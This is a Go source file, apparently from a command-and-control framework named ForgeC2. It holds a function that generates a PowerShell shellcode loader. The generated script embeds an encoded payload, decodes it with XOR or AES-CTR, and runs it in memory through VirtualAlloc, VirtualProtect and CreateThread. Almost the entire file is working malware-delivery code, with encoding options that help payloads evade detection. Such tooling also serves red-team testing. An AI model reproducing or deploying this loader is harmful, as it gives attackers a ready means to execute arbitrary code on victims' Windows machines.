package payload

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"strings"
)

// buildPS1Loader renders a PowerShell loader script that embeds the encoded
// shellcode blob, decodes it in-script (XOR byte loop or AES-CTR matching the
// Go encoders exactly; none/sgn blobs are executed as-is — SGN blobs carry
// their own decoder stub) and executes it via VirtualAlloc + CreateThread.
//
// The script fails loudly (throws) on any step that cannot complete; it never
// silently skips execution.
func buildPS1Loader(encoded []byte, key []byte, method ShellcodeEncode) ([]byte, error) {
	var keyBytes strings.Builder
	if len(key) == 0 {
		keyBytes.WriteString("0x41")
	} else {
		for i, b := range key {
			if i > 0 {
				keyBytes.WriteString(", ")
			}
			fmt.Fprintf(&keyBytes, "0x%02x", b)
		}
	}

	var decode strings.Builder
	switch method {
	case EncodeNone, EncodeSGN, "":
		// none: plain; sgn: the blob starts with a self-decoding stub.
	case EncodeXOR:
		decode.WriteString(`if ($method -eq 'xor') {
    for ($i = 0; $i -lt $blob.Length; $i++) { $blob[$i] = $blob[$i] -bxor $key[$i % $key.Length] }
}
`)
	case EncodeAES:
		decode.WriteString(`if ($method -eq 'aes') {
    $key16 = New-Object byte[] 16
    [Array]::Copy($key, $key16, [Math]::Min($key.Length, 16))
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $ivHash = $sha.ComputeHash($key16)
    $iv = New-Object byte[] 16
    [Array]::Copy($ivHash, $iv, 16)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key16
    $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $enc = $aes.CreateEncryptor()
    $ks = New-Object byte[] 16
    $ctr = New-Object byte[] 16
    for ($j = 0; $j -lt $blob.Length; $j += 16) {
        [Array]::Copy($iv, $ctr, 16)
        $enc.TransformBlock($ctr, 0, 16, $ks, 0) | Out-Null
        $n = [Math]::Min(16, $blob.Length - $j)
        for ($k = 0; $k -lt $n; $k++) { $blob[$j + $k] = $blob[$j + $k] -bxor $ks[$k] }
        for ($ci = 15; $ci -ge 0; $ci--) { $iv[$ci] = ($iv[$ci] + 1) -band 0xFF; if ($iv[$ci] -ne 0) { break } }
    }
}
`)
	default:
		return nil, fmt.Errorf("encode method %q is not supported for ps1 loaders", method)
	}

	var buf bytes.Buffer
	buf.WriteString("# ForgeC2 shellcode loader (generated artifact)\n")
	buf.WriteString("$ErrorActionPreference = 'Stop'\n")
	fmt.Fprintf(&buf, "$method = '%s'\n", string(method))
	buf.WriteString("$key = [byte[]]([byte[]]@(")
	buf.WriteString(keyBytes.String())
	buf.WriteString("))\n")
	buf.WriteString("$blob = [Convert]::FromBase64String('")
	buf.WriteString(base64.StdEncoding.EncodeToString(encoded))
	buf.WriteString("')\n")
	buf.WriteString(decode.String())
	buf.WriteString(`Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class L {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
'@
$addr = [L]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new($blob.Length), 0x3000, 0x04)
if ($addr -eq [IntPtr]::Zero) { throw 'VirtualAlloc failed' }
[System.Runtime.InteropServices.Marshal]::Copy($blob, 0, $addr, $blob.Length)
$old = 0
if (-not [L]::VirtualProtect($addr, [UIntPtr]::new($blob.Length), 0x20, [ref]$old)) { throw 'VirtualProtect failed' }
$tid = 0
$h = [L]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [ref]$tid)
if ($h -eq [IntPtr]::Zero) { throw 'CreateThread failed' }
[L]::WaitForSingleObject($h, 0xFFFFFFFF) | Out-Null
`)
	return buf.Bytes(), nil
}
